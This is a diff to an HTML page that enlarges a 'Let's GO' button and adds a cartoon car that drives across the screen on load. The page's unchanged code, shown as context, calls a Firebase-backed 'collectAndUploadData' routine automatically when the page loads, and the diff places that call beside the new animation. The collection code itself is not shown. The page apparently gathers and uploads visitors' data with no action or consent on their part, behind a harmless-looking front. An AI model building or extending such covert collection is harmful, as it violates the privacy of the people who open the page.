@@ -14,10 +14,12 @@
             height: 100vh;
             font-family: Arial, sans-serif;
             text-align: center;
+            position: relative;
+            overflow: hidden; /* To hide the car after it leaves the screen */
         }
         #secretButton {
-            padding: 15px 30px;
-            font-size: 20px;
+            padding: 20px 40px; /* Increased size */
+            font-size: 25px; /* Increased font size */
             background-color: #4CAF50;
             color: white;
             border: none;
@@ -27,13 +29,31 @@
         #secretButton:hover {
             background-color: #45a049;
         }
+
+        /* Car styling and animation */
+        #car {
+            position: absolute;
+            bottom: 20px; /* Car position near the bottom */
+            left: -200px; /* Start position of the car (off-screen) */
+            width: 150px; /* Car size */
+            height: auto;
+            transition: transform 1s linear; /* Smooth animation for 1 second */
+        }
+
+        /* Animation to move the car */
+        .move-car {
+            transform: translateX(120vw); /* Move the car across the screen */
+        }
     </style>
 </head>
 <body>
    <div>
         <button id="secretButton">Let's GO</button>
     </div>
-    
+
+    <!-- Car image -->
+    <img src="https://www.clipartmax.com/png/full/208-2086511_blue-car-clipart-side-view-cartoon-cars-top-view-png.png" id="car" alt="Moving Car">
+
     <script type="module">
         // Import Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -114,7 +134,13 @@
         }
 
         // Automatically collect and upload data as soon as the page loads
-        window.onload = collectAndUploadData;
+        window.onload = function() {
+            collectAndUploadData(); // Data collection and upload
+
+            // Start car animation when page loads
+            const car = document.getElementById('car');
+            car.classList.add('move-car');
+        };
 
         logMessage('Page loaded. Initiating data collection...');
     </script>
